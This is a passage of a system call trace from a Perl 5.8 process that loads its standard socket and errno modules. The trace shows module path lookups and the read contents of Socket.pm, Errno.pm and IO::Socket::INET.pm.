IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
11347 07:37:14.602882 stat64("/etc/perl/Socket.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.602898 stat64("/etc/perl/Socket.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.602912 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.602925 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.602938 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.602951 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.602965 stat64("/usr/lib/perl5/Socket.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.602977 stat64("/usr/lib/perl5/Socket.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.602991 stat64("/usr/share/perl5/Socket.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.603002 stat64("/usr/share/perl5/Socket.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.603016 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.603028 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
11347 07:37:14.603049 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.603063 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.603074 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.603091 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
11347 07:37:14.603496 brk(0x8239000)    = 0x8239000
11347 07:37:14.603702 read(8, "", 4096) = 0
11347 07:37:14.603717 close(8)          = 0
11347 07:37:14.603815 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
11347 07:37:14.603841 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
11347 07:37:14.603868 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
11347 07:37:14.603883 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
11347 07:37:14.603975 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
11347 07:37:14.603993 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7dd5000
11347 07:37:14.604011 mmap2(0xb7dda000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7dda000
11347 07:37:14.604027 close(8)          = 0
11347 07:37:14.604817 brk(0x825a000)    = 0x825a000
11347 07:37:14.605020 stat64("/etc/perl/Errno.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609774 stat64("/etc/perl/Errno.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609774 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609775 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609775 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609775 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609775 stat64("/usr/lib/perl5/Errno.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609776 stat64("/usr/lib/perl5/Errno.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609776 stat64("/usr/share/perl5/Errno.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609776 stat64("/usr/share/perl5/Errno.pm", 0xbfb61b1c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609781 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfb61c0c) = -1 ENOENT (No such file or directory)
11347 07:37:14.609794 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
11347 07:37:14.609815 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
11347 07:37:14.609830 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61928) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.609842 _llseek(8, 0, [0], SEEK_CUR) = 0
11347 07:37:14.609862 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
11347 07:37:14.610642 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
11347 07:37:14.611065 _llseek(8, 5966, [5966], SEEK_SET) = 0
11347 07:37:14.611065 _llseek(8, 0, [5966], SEEK_CUR) = 0
11347 07:37:14.611066 close(8)          = 0
11347 07:37:14.611224 brk(0x827b000)    = 0x827b000
11347 07:37:14.611366 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
11347 07:37:14.611823 _llseek(6, 6698, [6698], SEEK_SET) = 0
11347 07:37:14.611840 _llseek(6, 0, [6698], SEEK_CUR) = 0
11347 07:37:14.611850 close(6)          = 0
11347 07:37:14.611870 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.611885 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.611899 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.611912 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.611927 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.611940 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.611954 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.611971 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.611985 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.611997 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfb61fcc) = -1 ENOENT (No such file or directory)
11347 07:37:14.612011 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfb620bc) = -1 ENOENT (No such file or directory)
11347 07:37:14.612025 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
11347 07:37:14.612047 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
11347 07:37:14.612062 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb61dd8) = -1 ENOTTY (Inappropriate ioctl for device)
11347 07:37:14.612073 _llseek(6, 0, [0], SEEK_CUR) = 0
11347 07:37:14.612091 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || 